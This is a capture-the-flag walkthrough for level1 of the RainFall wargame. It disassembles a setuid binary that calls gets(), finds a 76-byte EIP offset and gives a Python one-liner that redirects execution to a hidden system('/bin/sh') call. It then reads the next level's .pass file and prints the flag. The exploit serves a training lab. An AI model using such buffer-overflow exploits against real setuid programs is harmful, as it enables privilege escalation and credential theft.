Once again we start this level by listing the files in the current directory:

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Let's check what's happening in level1 using **radare2**:

```bash
[0x08048390]> afl
0x08048340    1      6 sym.imp.gets
0x08048350    1      6 sym.imp.fwrite
0x08048360    1      6 sym.imp.system
0x08048380    1      6 sym.imp.__libc_start_main
0x08048390    1     34 sub.entry0_8048390
0x080483c0    6     85 sub.__do_global_dtors_aux_80483c0
0x08048420    4     35 sub.frame_dummy_8048420
0x08048520    4     42 sub.__do_global_ctors_aux_8048520
0x08048510    1      2 sub.__libc_csu_fini_8048510
0x08048512    1      4 sub.__i686.get_pc_thunk.bx_8048512
0x08048444    1     60 sub.run_8048444
0x0804854c    1     26 sub._fini_804854c
0x080484a0    4     97 sub.__libc_csu_init_80484a0
0x08048480    1     23 sub.main_8048480
0x080482f8    3     46 sub._init_80482f8
0x08048370    1      6 sub.loc.imp.__gmon_start___8048370
[0x08048390]> pdf @ sub.main_8048480
            ;-- main:
            ; ICOD XREF from sub.entry0_8048390 @ 0x80483a7(r)
┌ 23: sub.main_8048480 ();
│ afv: vars(1:sp[0x44..0x44])
│           0x08048480      55             push ebp
│           0x08048481      89e5           mov ebp, esp
│           0x08048483      83e4f0         and esp, 0xfffffff0
│           0x08048486      83ec50         sub esp, 0x50
│           0x08048489      8d442410       lea eax, [var_10h]
│           0x0804848d      890424         mov dword [esp], eax
│           0x08048490      e8abfeffff     call sym.imp.gets
│           0x08048495      c9             leave
└           0x08048496      c3             ret
[0x08048390]> pdf @ sub.run_8048444
            ;-- run:
┌ 60: sub.run_8048444 ();
│ afv: vars(3:sp[0x10..0x18])
│           0x08048444      55             push ebp
│           0x08048445      89e5           mov ebp, esp
│           0x08048447      83ec18         sub esp, 0x18
│           0x0804844a      a1c0970408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x80497c0:4]=0
│           0x0804844f      89c2           mov edx, eax
│           0x08048451      b870850408     mov eax, str.Good..._Wait_what__n ; 0x8048570 ; "Good... Wait what?\n"
│           0x08048456      8954240c       mov dword [var_ch], edx
│           0x0804845a      c744240813..   mov dword [var_8h], 0x13    ; [0x13:4]=-1 ; 19
│           0x08048462      c744240401..   mov dword [var_4h], 1
│           0x0804846a      890424         mov dword [esp], eax
│           0x0804846d      e8defeffff     call sym.imp.fwrite
│           0x08048472      c704248485..   mov dword [esp], str._bin_sh ; [0x8048584:4]=0x6e69622f ; "/bin/sh"
│           0x08048479      e8e2feffff     call sym.imp.system
│           0x0804847e      c9             leave
└           0x0804847f      c3             ret
```

What we can take away from this is that there is a `run` function in the program that calls `/bin/sh`, something we want to exploit. Let's look around and find a way to run this.
Using a [generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) we're going to try and find the **address** at which our **program segfaults**:

```bash
(gdb) r
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Thanks to this string we find the **EIP offset** at `0x63413563`, which means it is **76 chars** far.

```
The EIP offset is the number of characters needed to overwrite the saved return address on the stack
```

Now that we know this information, let's run a small **python script** to exploit it:

Script explanation:

- **"A" \* 76**: Fills the buffer exactly up to the return address (EIP offset).

- **"\x44\x84\x04\x08"**: Overwrites EIP with the address of the run function (0x08048444, little endian format).

- **( ... && cat)**: Keeps the shell open after exploitation so you can enter commands.

- **| ./level1**: Pipes the crafted input into the vulnerable program.

```bash
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"' && cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

This way we get our next flag !
